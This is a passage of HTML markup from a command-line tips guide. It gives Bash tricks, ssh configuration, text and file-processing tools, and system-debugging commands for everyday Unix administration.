&lt;p&gt;Brace expansion using &lt;code&gt;{&lt;/code&gt;...&lt;code&gt;}&lt;/code&gt; can reduce having to re-type similar text and automate combinations of items.  This is helpful in examples like &lt;code&gt;mv foo.{txt,pdf} some-dir&lt;/code&gt; (which moves both files), &lt;code&gt;cp somefile{,.bak}&lt;/code&gt; (which expands to &lt;code&gt;cp somefile somefile.bak&lt;/code&gt;) or &lt;code&gt;mkdir -p test-{a,b,c}/subtest-{1,2,3}&lt;/code&gt; (which expands all possible combinations and creates a directory tree). Brace expansion is performed before any other expansion.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The order of expansions is: brace expansion; tilde expansion, parameter and variable expansion, arithmetic expansion, and command substitution (done in a left-to-right fashion); word splitting; and filename expansion. (For example, a range like &lt;code&gt;{1..20}&lt;/code&gt; cannot be expressed with variables using &lt;code&gt;{$a..$b}&lt;/code&gt;. Use &lt;code&gt;seq&lt;/code&gt; or a &lt;code&gt;for&lt;/code&gt; loop instead, e.g., &lt;code&gt;seq $a $b&lt;/code&gt; or &lt;code&gt;for((i=a; i&amp;lt;=b; i++)); do ... ; done&lt;/code&gt;.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The output of a command can be treated like a file via &lt;code&gt;&amp;lt;(some command)&lt;/code&gt; (known as process substitution). For example, compare local &lt;code&gt;/etc/hosts&lt;/code&gt; with a remote one:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      diff /etc/hosts &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;&amp;lt;(&lt;/span&gt;ssh somehost cat /etc/hosts&lt;span class="pl-pds"&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;When writing scripts you may want to put all of your code in curly braces. If the closing brace is missing, your script will be prevented from executing due to a syntax error. This makes sense when your script is going to be downloaded from the web, since it prevents partially downloaded scripts from executing:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;{
      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Your code here&lt;/span&gt;
}&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;A "here document" allows &lt;a href="https://www.tldp.org/LDP/abs/html/here-docs.html" rel="nofollow"&gt;redirection of multiple lines of input&lt;/a&gt; as if from a file:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;cat &amp;lt;&amp;lt;EOF
input
on multiple lines
EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;In Bash, redirect both standard output and standard error via: &lt;code&gt;some-command &amp;gt;logfile 2&amp;gt;&amp;amp;1&lt;/code&gt; or &lt;code&gt;some-command &amp;amp;&amp;gt;logfile&lt;/code&gt;. Often, to ensure a command does not leave an open file handle to standard input, tying it to the terminal you are in, it is also good practice to add &lt;code&gt;&amp;lt;/dev/null&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;man ascii&lt;/code&gt; for a good ASCII table, with hex and decimal values. For general encoding info, &lt;code&gt;man unicode&lt;/code&gt;, &lt;code&gt;man utf-8&lt;/code&gt;, and &lt;code&gt;man latin1&lt;/code&gt; are helpful.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;screen&lt;/code&gt; or &lt;a href="https://tmux.github.io/" rel="nofollow"&gt;&lt;code&gt;tmux&lt;/code&gt;&lt;/a&gt; to multiplex the screen, especially useful on remote ssh sessions and to detach and re-attach to a session. &lt;code&gt;byobu&lt;/code&gt; can enhance screen or tmux by providing more information and easier management. A more minimal alternative for session persistence only is &lt;a href="https://github.com/bogner/dtach"&gt;&lt;code&gt;dtach&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In ssh, knowing how to port tunnel with &lt;code&gt;-L&lt;/code&gt; or &lt;code&gt;-D&lt;/code&gt; (and occasionally &lt;code&gt;-R&lt;/code&gt;) is useful, e.g. to access web sites from a remote server.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;It can be useful to make a few optimizations to your ssh configuration; for example, this &lt;code&gt;~/.ssh/config&lt;/code&gt; contains settings to avoid dropped connections in certain network environments, uses compression (which is helpful with scp over low-bandwidth connections), and multiplex channels to the same server with a local control file:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;      TCPKeepAlive=yes
      ServerAliveInterval=15
      ServerAliveCountMax=6
      Compression=yes
      ControlMaster auto
      ControlPath /tmp/%r@%h:%p
      ControlPersist yes
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A few other options relevant to ssh are security sensitive and should be enabled with care, e.g. per subnet or host or in trusted networks: &lt;code&gt;StrictHostKeyChecking=no&lt;/code&gt;, &lt;code&gt;ForwardAgent=yes&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Consider &lt;a href="https://mosh.mit.edu/" rel="nofollow"&gt;&lt;code&gt;mosh&lt;/code&gt;&lt;/a&gt; an alternative to ssh that uses UDP, avoiding dropped connections and adding convenience on the road (requires server-side setup).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To get the permissions on a file in octal form, which is useful for system configuration but not available in &lt;code&gt;ls&lt;/code&gt; and easy to bungle, use something like&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      stat -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;%A %a %n&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; /etc/timezone&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;For interactive selection of values from the output of another command, use &lt;a href="https://github.com/mooz/percol"&gt;&lt;code&gt;percol&lt;/code&gt;&lt;/a&gt; or &lt;a href="https://github.com/junegunn/fzf"&gt;&lt;code&gt;fzf&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For interaction with files based on the output of another command (like &lt;code&gt;git&lt;/code&gt;), use &lt;code&gt;fpp&lt;/code&gt; (&lt;a href="https://github.com/facebook/PathPicker"&gt;PathPicker&lt;/a&gt;).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For a simple web server for all files in the current directory (and subdirs), available to anyone on your network, use:
&lt;code&gt;python -m SimpleHTTPServer 7777&lt;/code&gt; (for port 7777 and Python 2) and &lt;code&gt;python -m http.server 7777&lt;/code&gt; (for port 7777 and Python 3).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For running a command as another user, use &lt;code&gt;sudo&lt;/code&gt;. Defaults to running as root; use &lt;code&gt;-u&lt;/code&gt; to specify another user. Use &lt;code&gt;-i&lt;/code&gt; to login as that user (you will be asked for &lt;em&gt;your&lt;/em&gt; password).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For switching the shell to another user, use &lt;code&gt;su username&lt;/code&gt; or &lt;code&gt;su - username&lt;/code&gt;. The latter with "-" gets an environment as if another user just logged in. Omitting the username defaults to root. You will be asked for the password &lt;em&gt;of the user you are switching to&lt;/em&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know about the &lt;a href="https://wiki.debian.org/CommonErrorMessages/ArgumentListTooLong" rel="nofollow"&gt;128K limit&lt;/a&gt; on command lines. This "Argument list too long" error is common when wildcard matching large numbers of files. (When this happens alternatives like &lt;code&gt;find&lt;/code&gt; and &lt;code&gt;xargs&lt;/code&gt; may help.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For a basic calculator (and of course access to Python in general), use the &lt;code&gt;python&lt;/code&gt; interpreter. For example,&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 2+3
5
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a id="user-content-processing-files-and-data" class="anchor" aria-hidden="true" href="#processing-files-and-data"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Processing files and data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;To locate a file by name in the current directory, &lt;code&gt;find . -iname '*something*'&lt;/code&gt; (or similar). To find a file anywhere by name, use &lt;code&gt;locate something&lt;/code&gt; (but bear in mind &lt;code&gt;updatedb&lt;/code&gt; may not have indexed recently created files).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For general searching through source or data files, there are several options more advanced or faster than &lt;code&gt;grep -r&lt;/code&gt;, including (in rough order from older to newer) &lt;a href="https://github.com/beyondgrep/ack2"&gt;&lt;code&gt;ack&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://github.com/ggreer/the_silver_searcher"&gt;&lt;code&gt;ag&lt;/code&gt;&lt;/a&gt; ("the silver searcher"), and &lt;a href="https://github.com/BurntSushi/ripgrep"&gt;&lt;code&gt;rg&lt;/code&gt;&lt;/a&gt; (ripgrep).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To convert HTML to text: &lt;code&gt;lynx -dump -stdin&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For Markdown, HTML, and all kinds of document conversion, try &lt;a href="http://pandoc.org/" rel="nofollow"&gt;&lt;code&gt;pandoc&lt;/code&gt;&lt;/a&gt;. For example, to convert a Markdown document to Word format: &lt;code&gt;pandoc README.md --from markdown --to docx -o temp.docx&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If you must handle XML, &lt;code&gt;xmlstarlet&lt;/code&gt; is old but good.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For JSON, use &lt;a href="http://stedolan.github.io/jq/" rel="nofollow"&gt;&lt;code&gt;jq&lt;/code&gt;&lt;/a&gt;. For interactive use, also see &lt;a href="https://github.com/simeji/jid"&gt;&lt;code&gt;jid&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://github.com/fiatjaf/jiq"&gt;&lt;code&gt;jiq&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For YAML, use &lt;a href="https://github.com/0k/shyaml"&gt;&lt;code&gt;shyaml&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For Excel or CSV files, &lt;a href="https://github.com/onyxfish/csvkit"&gt;csvkit&lt;/a&gt; provides &lt;code&gt;in2csv&lt;/code&gt;, &lt;code&gt;csvcut&lt;/code&gt;, &lt;code&gt;csvjoin&lt;/code&gt;, &lt;code&gt;csvgrep&lt;/code&gt;, etc.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For Amazon S3, &lt;a href="https://github.com/s3tools/s3cmd"&gt;&lt;code&gt;s3cmd&lt;/code&gt;&lt;/a&gt; is convenient and &lt;a href="https://github.com/bloomreach/s4cmd"&gt;&lt;code&gt;s4cmd&lt;/code&gt;&lt;/a&gt; is faster. Amazon's &lt;a href="https://github.com/aws/aws-cli"&gt;&lt;code&gt;aws&lt;/code&gt;&lt;/a&gt; and the improved &lt;a href="https://github.com/donnemartin/saws"&gt;&lt;code&gt;saws&lt;/code&gt;&lt;/a&gt; are essential for other AWS-related tasks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know about &lt;code&gt;sort&lt;/code&gt; and &lt;code&gt;uniq&lt;/code&gt;, including uniq's &lt;code&gt;-u&lt;/code&gt; and &lt;code&gt;-d&lt;/code&gt; options -- see one-liners below. See also &lt;code&gt;comm&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know about &lt;code&gt;cut&lt;/code&gt;, &lt;code&gt;paste&lt;/code&gt;, and &lt;code&gt;join&lt;/code&gt; to manipulate text files. Many people use &lt;code&gt;cut&lt;/code&gt; but forget about &lt;code&gt;join&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know about &lt;code&gt;wc&lt;/code&gt; to count newlines (&lt;code&gt;-l&lt;/code&gt;), characters (&lt;code&gt;-m&lt;/code&gt;), words (&lt;code&gt;-w&lt;/code&gt;) and bytes (&lt;code&gt;-c&lt;/code&gt;).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know about &lt;code&gt;tee&lt;/code&gt; to copy from stdin to a file and also to stdout, as in &lt;code&gt;ls -al | tee file.txt&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For more complex calculations, including grouping, reversing fields, and statistical calculations, consider &lt;a href="https://www.gnu.org/software/datamash/" rel="nofollow"&gt;&lt;code&gt;datamash&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know that locale affects a lot of command line tools in subtle ways, including sorting order (collation) and performance. Most Linux installations will set &lt;code&gt;LANG&lt;/code&gt; or other locale variables to a local setting like US English. But be aware sorting will change if you change locale. And know i18n routines can make sort or other commands run &lt;em&gt;many times&lt;/em&gt; slower. In some situations (such as the set operations or uniqueness operations below) you can safely ignore slow i18n routines entirely and use traditional byte-based sort order, using &lt;code&gt;export LC_ALL=C&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;You can set a specific command's environment by prefixing its invocation with the environment variable settings, as in &lt;code&gt;TZ=Pacific/Fiji date&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know basic &lt;code&gt;awk&lt;/code&gt; and &lt;code&gt;sed&lt;/code&gt; for simple data munging. See &lt;a href="#one-liners"&gt;One-liners&lt;/a&gt; for examples.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To replace all occurrences of a string in place, in one or more files:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      perl -pi.bak -e &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;s/old-string/new-string/g&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; my-files-&lt;span class="pl-k"&gt;*&lt;/span&gt;.txt&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;To rename multiple files and/or search and replace within files, try &lt;a href="https://github.com/jlevy/repren"&gt;&lt;code&gt;repren&lt;/code&gt;&lt;/a&gt;. (In some cases the &lt;code&gt;rename&lt;/code&gt; command also allows multiple renames, but be careful as its functionality is not the same on all Linux distributions.)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Full rename of filenames, directories, and contents foo -&amp;gt; bar:&lt;/span&gt;
      repren --full --preserve-case --from foo --to bar &lt;span class="pl-c1"&gt;.&lt;/span&gt;
      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Recover backup files whatever.bak -&amp;gt; whatever:&lt;/span&gt;
      repren --renames --from &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;(.*)\.bak&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; --to &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;\1&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt;.bak
      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Same as above, using rename, if available:&lt;/span&gt;
      rename &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;s/\.bak$//&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt;.bak&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;As the man page says, &lt;code&gt;rsync&lt;/code&gt; really is a fast and extraordinarily versatile file copying tool. It's known for synchronizing between machines but is equally useful locally. When security restrictions allow, using &lt;code&gt;rsync&lt;/code&gt; instead of &lt;code&gt;scp&lt;/code&gt; allows recovery of a transfer without restarting from scratch. It also is among the &lt;a href="https://web.archive.org/web/20130929001850/http://linuxnote.net/jianingy/en/linux/a-fast-way-to-remove-huge-number-of-files.html" rel="nofollow"&gt;fastest ways&lt;/a&gt; to delete large numbers of files:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;mkdir empty &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; rsync -r --delete empty/ some-dir &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; rmdir some-dir&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;For monitoring progress when processing files, use &lt;a href="http://www.ivarch.com/programs/pv.shtml" rel="nofollow"&gt;&lt;code&gt;pv&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://github.com/dmerejkowsky/pycp"&gt;&lt;code&gt;pycp&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://github.com/dspinellis/pmonitor"&gt;&lt;code&gt;pmonitor&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://github.com/Xfennec/progress"&gt;&lt;code&gt;progress&lt;/code&gt;&lt;/a&gt;, &lt;code&gt;rsync --progress&lt;/code&gt;, or, for block-level copying, &lt;code&gt;dd status=progress&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;shuf&lt;/code&gt; to shuffle or select random lines from a file.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know &lt;code&gt;sort&lt;/code&gt;'s options. For numbers, use &lt;code&gt;-n&lt;/code&gt;, or &lt;code&gt;-h&lt;/code&gt; for handling human-readable numbers (e.g. from &lt;code&gt;du -h&lt;/code&gt;). Know how keys work (&lt;code&gt;-t&lt;/code&gt; and &lt;code&gt;-k&lt;/code&gt;). In particular, watch out that you need to write &lt;code&gt;-k1,1&lt;/code&gt; to sort by only the first field; &lt;code&gt;-k1&lt;/code&gt; means sort according to the whole line. Stable sort (&lt;code&gt;sort -s&lt;/code&gt;) can be useful. For example, to sort first by field 2, then secondarily by field 1, you can use &lt;code&gt;sort -k1,1 | sort -s -k2,2&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If you ever need to write a tab literal in a command line in Bash (e.g. for the -t argument to sort), press &lt;strong&gt;ctrl-v&lt;/strong&gt; &lt;strong&gt;[Tab]&lt;/strong&gt; or write &lt;code&gt;$'\t'&lt;/code&gt; (the latter is better as you can copy/paste it).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The standard tools for patching source code are &lt;code&gt;diff&lt;/code&gt; and &lt;code&gt;patch&lt;/code&gt;. See also &lt;code&gt;diffstat&lt;/code&gt; for summary statistics of a diff and &lt;code&gt;sdiff&lt;/code&gt; for a side-by-side diff. Note &lt;code&gt;diff -r&lt;/code&gt; works for entire directories. Use &lt;code&gt;diff -r tree1 tree2 | diffstat&lt;/code&gt; for a summary of changes. Use &lt;code&gt;vimdiff&lt;/code&gt; to compare and edit files.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For binary files, use &lt;code&gt;hd&lt;/code&gt;, &lt;code&gt;hexdump&lt;/code&gt; or &lt;code&gt;xxd&lt;/code&gt; for simple hex dumps and &lt;code&gt;bvi&lt;/code&gt;, &lt;code&gt;hexedit&lt;/code&gt; or &lt;code&gt;biew&lt;/code&gt; for binary editing.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Also for binary files, &lt;code&gt;strings&lt;/code&gt; (plus &lt;code&gt;grep&lt;/code&gt;, etc.) lets you find bits of text.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For binary diffs (delta compression), use &lt;code&gt;xdelta3&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To convert text encodings, try &lt;code&gt;iconv&lt;/code&gt;. Or &lt;code&gt;uconv&lt;/code&gt; for more advanced use; it supports some advanced Unicode things. For example:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Displays hex codes or actual names of characters (useful for debugging):&lt;/span&gt;
      uconv -f utf-8 -t utf-8 -x &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;::Any-Hex;&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;&amp;lt;&lt;/span&gt; input.txt
      uconv -f utf-8 -t utf-8 -x &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;::Any-Name;&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;&amp;lt;&lt;/span&gt; input.txt
      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Lowercase and removes all accents (by expanding and dropping them):&lt;/span&gt;
      uconv -f utf-8 -t utf-8 -x &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;::Any-Lower; ::Any-NFD; [:Nonspacing Mark:] &amp;gt;; ::Any-NFC;&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;&amp;lt;&lt;/span&gt; input.txt &lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt; output.txt&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;To split files into pieces, see &lt;code&gt;split&lt;/code&gt; (to split by size) and &lt;code&gt;csplit&lt;/code&gt; (to split by a pattern).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Date and time: To get the current date and time in the helpful &lt;a href="https://en.wikipedia.org/wiki/ISO_8601" rel="nofollow"&gt;ISO 8601&lt;/a&gt; format, use &lt;code&gt;date -u +"%Y-%m-%dT%H:%M:%SZ"&lt;/code&gt; (other options &lt;a href="https://stackoverflow.com/questions/7216358/date-command-on-os-x-doesnt-have-iso-8601-i-option" rel="nofollow"&gt;are&lt;/a&gt; &lt;a href="https://unix.stackexchange.com/questions/164826/date-command-iso-8601-option" rel="nofollow"&gt;problematic&lt;/a&gt;). To manipulate date and time expressions, use &lt;code&gt;dateadd&lt;/code&gt;, &lt;code&gt;datediff&lt;/code&gt;, &lt;code&gt;strptime&lt;/code&gt; etc. from &lt;a href="http://www.fresse.org/dateutils/" rel="nofollow"&gt;&lt;code&gt;dateutils&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;zless&lt;/code&gt;, &lt;code&gt;zmore&lt;/code&gt;, &lt;code&gt;zcat&lt;/code&gt;, and &lt;code&gt;zgrep&lt;/code&gt; to operate on compressed files.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;File attributes are settable via &lt;code&gt;chattr&lt;/code&gt; and offer a lower-level alternative to file permissions. For example, to protect against accidental file deletion the immutable flag:  &lt;code&gt;sudo chattr +i /critical/directory/or/file&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;getfacl&lt;/code&gt; and &lt;code&gt;setfacl&lt;/code&gt; to save and restore file permissions. For example:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;   getfacl -R /some/path &lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt; permissions.txt
   setfacl --restore=permissions.txt&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;To create empty files quickly, use &lt;code&gt;truncate&lt;/code&gt; (creates &lt;a href="https://en.wikipedia.org/wiki/Sparse_file" rel="nofollow"&gt;sparse file&lt;/a&gt;), &lt;code&gt;fallocate&lt;/code&gt; (ext4, xfs, btrfs and ocfs2 filesystems), &lt;code&gt;xfs_mkfile&lt;/code&gt; (almost any filesystems, comes in xfsprogs package), &lt;code&gt;mkfile&lt;/code&gt; (for Unix-like systems like Solaris, Mac OS).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-system-debugging" class="anchor" aria-hidden="true" href="#system-debugging"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;System debugging&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;For web debugging, &lt;code&gt;curl&lt;/code&gt; and &lt;code&gt;curl -I&lt;/code&gt; are handy, or their &lt;code&gt;wget&lt;/code&gt; equivalents, or the more modern &lt;a href="https://github.com/jkbrzt/httpie"&gt;&lt;code&gt;httpie&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To know current cpu/disk status, the classic tools are &lt;code&gt;top&lt;/code&gt; (or the better &lt;code&gt;htop&lt;/code&gt;), &lt;code&gt;iostat&lt;/code&gt;, and &lt;code&gt;iotop&lt;/code&gt;. Use &lt;code&gt;iostat -mxz 15&lt;/code&gt; for basic CPU and detailed per-partition disk stats and performance insight.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For network connection details, use &lt;code&gt;netstat&lt;/code&gt; and &lt;code&gt;ss&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For a quick overview of what's happening on a system, &lt;code&gt;dstat&lt;/code&gt; is especially useful. For broadest overview with details, use &lt;a href="https://github.com/nicolargo/glances"&gt;&lt;code&gt;glances&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To know memory status, run and understand the output of &lt;code&gt;free&lt;/code&gt; and &lt;code&gt;vmstat&lt;/code&gt;. In particular, be aware the "cached" value is memory held by the Linux kernel as file cache, so effectively counts toward the "free" value.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java system debugging is a different kettle of fish, but a simple trick on Oracle's and some other JVMs is that you can run &lt;code&gt;kill -3 &amp;lt;pid&amp;gt;&lt;/code&gt; and a full stack trace and heap summary (including generational garbage collection details, which can be highly informative) will be dumped to stderr/logs. The JDK's &lt;code&gt;jps&lt;/code&gt;, &lt;code&gt;jstat&lt;/code&gt;, &lt;code&gt;jstack&lt;/code&gt;, &lt;code&gt;jmap&lt;/code&gt; are useful. &lt;a href="https://github.com/aragozin/jvm-tools"&gt;SJK tools&lt;/a&gt; are more advanced.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;a href="http://www.bitwizard.nl/mtr/" rel="nofollow"&gt;&lt;code&gt;mtr&lt;/code&gt;&lt;/a&gt; as a better traceroute, to identify network issues.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
